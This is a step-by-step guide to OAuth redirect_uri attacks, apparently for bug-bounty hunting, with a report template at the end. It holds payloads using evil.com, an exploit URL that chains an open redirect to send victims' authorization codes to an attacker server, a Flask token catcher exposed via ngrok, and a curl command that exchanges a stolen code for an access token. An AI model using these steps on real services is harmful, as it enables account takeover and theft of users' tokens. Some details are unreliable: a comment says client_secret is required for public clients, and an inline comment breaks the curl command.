# OAuth redirect_uri Attack Guide

## Understanding the Attack Surface

The `redirect_uri` parameter in OAuth 2.0 is where the authorization server sends the auth code or token after the user authenticates. If an attacker can control this destination, they receive the code/token and can impersonate the victim.

## Step 1 — Identify the OAuth Flow

Look for:
- `/oauth/authorize` or `/connect/authorize` endpoints
- Parameters: `response_type=code` (auth code flow) or `response_type=token` (implicit flow)
- `redirect_uri=` parameter in the URL

```
GET /oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://app.target.com/callback&
  response_type=code&
  scope=read:email&
  state=RANDOM_STATE
```

## Step 2 — Enumerate What the IdP Validates

Test each of these to discover how strictly the IdP validates `redirect_uri`:

| Test | Payload | Validation Weakness |
|---|---|---|
| Extra path | `https://app.target.com/callback/extra` | Prefix-only match |
| Query string | `https://app.target.com/callback?injected=x` | Prefix-only match |
| Fragment | `https://app.target.com/callback%23.evil.com` | Exact match without decoding |
| Subdomain | `https://evil.app.target.com/callback` | Wildcard `*.target.com` |
| Open redirect chain | `https://app.target.com/go?to=https://evil.com` | Domain-only validation |
| Port variation | `https://app.target.com:8080/callback` | No port check |
| Path traversal | `https://app.target.com/callback/../evil` | No path normalization |

## Step 3 — Chain with Open Redirect

If `app.target.com` has an open redirect at `/go?to=`:

```bash
# Craft the full exploit URL:
https://accounts.provider.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://app.target.com/go%3Fto%3Dhttps%3A%2F%2FYOUR-SERVER%2Fcallback&
  response_type=code&
  scope=email+profile&
  state=CONTROLLED_STATE

# When victim clicks and authenticates:
# 1. IdP validates redirect_uri host = app.target.com ✓
# 2. IdP sends: GET https://app.target.com/go?to=https://YOUR-SERVER/callback?code=AUTH_CODE
# 3. App redirects to: https://YOUR-SERVER/callback?code=AUTH_CODE
# 4. You exchange code for access token
```

## Step 4 — Set Up Your Token Catcher

```python
# Simple Flask catcher — pip install flask
from flask import Flask, request
app = Flask(__name__)

@app.route('/callback')
def catch():
    code = request.args.get('code')
    token = request.args.get('access_token')
    print(f"[+] Auth Code: {code}")
    print(f"[+] Access Token: {token}")
    print(f"[+] Full URL: {request.url}")
    return "Got it!", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

```bash
# Expose to internet
ngrok http 8080
# Use ngrok URL as YOUR-SERVER
```

## Step 5 — Exchange Code for Token

```bash
# Exchange auth code for access token (client credentials depend on the app)
curl -X POST https://accounts.provider.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \   # required if public client
  -d "code=AUTH_CODE_CAPTURED" \
  -d "redirect_uri=https://app.target.com/go?to=https://YOUR-SERVER/callback"
```

Note: if you don't have `client_secret`, the code exchange may still work for public clients or mobile apps.

## Implicit Flow — Token in Fragment

When `response_type=token`, the token is in the URL fragment:

```
https://app.target.com/callback#access_token=TOKEN&token_type=Bearer
```

The fragment is NOT sent to the server — but if the page at `/callback` loads external resources, the `Referer` header leaks it:

```html
<!-- If callback page includes this script: -->
<script src="https://analytics.third-party.com/track.js"></script>
<!-- Browser sends: Referer: https://app.target.com/callback#access_token=TOKEN -->
```

**Test:** view source of `/callback` page — look for external scripts, images, or iframes.

## PKCE — Does It Help?

PKCE (Proof Key for Code Exchange) prevents code interception by binding the authorization request to a code verifier. However, it does NOT prevent `redirect_uri` manipulation — if you receive the code AND control the client, you still have the verifier and can exchange it.

PKCE only defends against a man-in-the-middle who intercepts the code without the verifier.

## Common IdP Behaviors

| IdP | Default redirect_uri validation |
|---|---|
| Google | Exact match only (scheme, host, port, path) |
| GitHub | Exact match or registered prefix |
| Facebook | Exact match required |
| Microsoft/Azure AD | Exact match (by default), wildcards if configured |
| Okta | Configurable — often prefix match in older configs |
| Auth0 | Wildcard `*` support in some configs |
| Keycloak | Configurable — often `*` wildcard enabled by default |
| Custom OAuth servers | High variance — usually weakest validation |

## Reporting OAuth redirect_uri

```
Title: OAuth redirect_uri Bypass → Authorization Code/Token Theft → Account Takeover

Severity: Critical
CWE: CWE-601 (Open Redirect) + CWE-346 (Origin Validation Error)
OWASP: A07:2021 – Identification and Authentication Failures

Steps to reproduce:
1. Identify open redirect at: https://app.target.com/go?to=
2. Confirm: GET https://app.target.com/go?to=https://evil.com → 302 Location: https://evil.com
3. Craft OAuth URL with redirect_uri=https://app.target.com/go%3Fto%3Dhttps%3A%2F%2Fevil.com
4. Victim authenticates → auth code received at evil.com
5. Exchange code for access token → victim's account fully compromised

Impact: Full account takeover for any user who clicks the link.
```
